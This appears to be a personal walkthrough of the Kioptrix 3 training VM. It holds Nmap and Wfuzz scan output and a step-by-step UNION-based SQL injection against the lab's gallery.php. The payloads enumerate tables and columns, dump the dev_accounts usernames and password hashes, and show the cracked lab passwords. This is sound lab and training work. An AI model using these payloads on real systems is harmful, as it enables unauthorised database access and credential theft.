```
IP=192.168.56.103
```
## Nmap Results
<pre style="font-size: 12px";>
PORT   STATE SERVICE VERSION
<font color=red>22</font>/tcp open  ssh     OpenSSH<font color=red> 4.7p1</font> Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
<font color=red>80</font>/tcp open  http    Apache httpd<font color=red> 2.2.8</font> ((Ubuntu) <font color=red>PHP</font>/<font color=red>5.2.4</font>-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/<font color=red>2.2.8</font> (Ubuntu) <font color=red>PHP</font>/<font color=red>5.2.4</font>-2ubuntu5.6 with Suhosin-Patch
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

## Wfuzz Results
<pre style="font-size: 12px";>
Files:
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000011:   200        0 L      2 W        18 Ch       "<font color=red>update.php</font>"
000000001:   200        38 L     190 W      1819 Ch     "<font color=red>index.php</font>"
000000110:   200        5 L      56 W       21752 Ch    "favicon.ico"

Directories
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000007:   200        38 L     190 W      1819 Ch     "cache"
000000005:   200        21 L     137 W      2185 Ch     "modules"
000000059:   403        10 L     33 W       326 Ch      "data"
000000120:   500        102 L    472 W      5651 Ch     "gallery"
000000300:   200        139 L    526 W      8136 Ch     "<font color=red>phpmyadmin</font>" -> <font color=red>2.11.3</font>deb1<font color=red>ubuntu</font>1.3
000000386:   200        1002 L   4785 W     69404 Ch    "icons"
000004227:   403        10 L     33 W       335 Ch      "server-status"

Others:
http://kioptrix3.com/index.php?system=Admin
http://kioptrix3.com/gallery/gadmin/ -> view source on /gallery/
</pre>

<pre style="font-size: 12px";>
Potenstial SQL injection:
http://kioptrix3.com/gallery/gallery.php?id=<font color=red>asd</font>&sort=photoid
</pre>
Credentials:
loneferret -> http://kioptrix3.com/index.php?system=Blog&archive=2010-8


```SQL
SELECT * FROM table_name WHERE id=1 ORDER BY parentid, sort, name;
SELECT * FROM table_name WHERE id=1 ORDER BY 7--ORDER BY parentid, sort, name; # has 6 columns.
SELECT * FROM table_name WHERE  # append 1,2,3,4,5,6 into the original select query
```

<pre style="font-size: 12px";>
id=1 UNION SELECT 1,2,3,4,5,6--
</pre>
![](../../Assets/images/kioptrix3/Pasted%20image%2020220730210643.png)

<pre style="font-size: 12px";>
id=1 UNION SELECT 1,version(),database(),4,5,6--
</pre>
![](../../Assets/images/kioptrix3/Pasted%20image%2020220731111337.png)

<pre style="font-size: 12px";>
1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database() --
</pre>
![](../../Assets/images/kioptrix3/Pasted%20image%2020220731111505.png)
<pre style="font-size: 12px";>
1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name='dev_accounts'--
</pre>
![](../../Assets/images/kioptrix3/Pasted%20image%2020220731111734.png)
<pre style="font-size: 12px";>
1 union select 1,username,password,4,5,6 from dev_accounts--
</pre>
![](../../Assets/images/kioptrix3/Pasted%20image%2020220731111835.png)

```
dreg:0d3eccfb887aabd50f243b3f155c0f85 -> Mast3r
loneferret:5badcaf789d3d1d09794d8f021f40f0e -> starwars
```
## Resource
1. https://www.yeahhub.com/advanced-error-based-sql-injection-exploitation-manually/
2. https://portswigger.net/web-security/sql-injection/examining-the-database